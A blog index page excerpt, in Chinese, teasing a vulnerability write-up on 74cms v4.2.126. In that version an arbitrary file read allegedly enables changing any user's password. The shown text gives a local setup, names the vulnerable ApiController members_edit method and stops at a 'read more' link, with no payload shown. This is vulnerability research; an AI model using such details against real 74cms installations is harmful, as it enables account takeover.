+        <h1 id="74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞"><a href="#74cms-v4-2-126-因任意文件读取漏洞导致的任意用户密码修改漏洞" class="headerlink" title="74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞"></a>74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%820x01">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。0x01</a> 74cms升级到最新版1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>突突突突突突突文件：74cms\upload\Application\Home\Controller\ApiController.class.php方法：members_edit(</p>
+<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId23.png"></p>
+<p>从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。那么就让我们直接利用试试。</p>
+<p>先看看数据库现在的数据</p>
+<p><img src="/resource/74cmsv4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>接着让我们来调接口看看</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/74cms/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/74cms/74cms%20v4.2.126-%E5%9B%A0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlbd000fy8v11k3z9eax" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/99/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/98/">98</a><a class="page-number" href="/page/99/">99</a><span class="page-number current">100</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/101/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
